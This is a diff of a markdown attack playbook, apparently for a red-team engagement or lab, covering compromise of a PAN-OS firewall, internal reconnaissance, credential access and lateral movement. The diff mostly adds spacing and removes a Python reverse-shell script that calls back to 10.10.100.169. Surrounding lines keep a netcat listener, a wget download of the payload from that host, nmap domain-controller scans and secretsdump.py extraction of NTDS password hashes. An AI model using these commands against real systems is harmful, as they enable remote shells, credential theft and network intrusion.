@@ -58,6 +58,22 @@ Post-Exploitation:
 ● Identify internal routes/interfaces.
 ● Upload a simple proxy (e.g., socat or chisel) if needed for tunneling
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
 # Phase 2: Internal Reconnaissance & Enumeration
 Once inside the firewall OS:
 ### Identify internal interfaces and routes
@@ -88,24 +104,6 @@ nc -lvnp 63842
 sudo vim /tmp/pan_os_comm.py
 ```
 
-`i`
-```python
-usr/bin/env python3 
-
-import socket,subprocess,os;
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.100.169",63842));
-
-os.dup2(s.fileno(),0); 
-
-os.dup2(s.fileno(),1);
-
-os.dup2(s.fileno(),2);
-
-import pty; pty.spawn("sh")
-```
-`:wq!`
-
 ```bash
 cd /tmp
 wget http://10.10.100.169/pan_os_comm.py
@@ -125,6 +123,18 @@ chmod +x /tmp/pan_os_comm.py
 - sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
 network.
 
+
+---
+
+
+
+
+
+
+
+
+
+
 # Phase 3: Target Discovery Inside Orange Space
 Assuming pivot success to internal hosts:
 #### Scan internal subnets for DC or LDAP
@@ -133,6 +143,14 @@ nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
 ```
 
 - Look for the Domain Controller (likely in orange-servers or orange-users).
+
+
+
+
+
+---
+
+
 
 # Phase 4: Credential Access (via LDAP, SAM/NTDS)
 - Once a DC is identified (e.g., 172.20.2.X), you can:
@@ -162,6 +180,11 @@ Then parse locally:
 ```bash
 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
 ```
+
+
+---
+
+
 # Phase 5: Lateral Movement and Persistence
 Use Admin Shares:
 ```bash
